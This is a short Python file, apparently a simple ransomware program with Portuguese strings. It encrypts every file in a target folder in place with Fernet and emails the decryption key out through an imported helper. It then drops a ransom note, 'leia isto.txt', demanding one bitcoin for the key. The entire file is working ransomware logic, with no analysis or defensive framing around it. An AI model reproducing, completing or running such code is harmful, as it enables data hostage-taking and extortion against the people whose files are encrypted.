# encryptor.py

import os
from cryptography.fernet import Fernet
from utils import generate_key, generate_identifier, send_email, list_files

def encrypt_files(folder_path):
    key = generate_key()
    fernet = Fernet(key)
    identifier = generate_identifier()

    for filename in list_files(folder_path):
        #file_path = os.path.join(folder_path, filename)
        if os.path.isfile(filename):
            with open(filename, 'rb') as file:
                original = file.read()
            encrypted = fernet.encrypt(original)
            with open(filename, 'wb') as file:
                file.write(encrypted)

    subject = f"Chave de criptografia - ID {identifier}"
    body = f"Chave: {key.decode()}"
    send_email(subject, body)
    print(f"Arquivos criptografados. Chave enviada com ID {identifier}.")
    create_recovery_message(identifier)

def create_recovery_message(id):
    with open("leia isto.txt", "w") as f:
        f.write("Seus dados foram criptografados\n")
        f.write("Envie 1 bitcoin para este endereço xyz e\n envie o comprovante com a key: " + id + "\n")
        f.write("depois disso, enviaremos a chave e instruções para você recuperar seus dados")

# Exemplo de uso
# encrypt_files("/caminho/para/seus/arquivos")
def main():
    encrypt_files("testeFiles")

if __name__ == "__main__":
    main()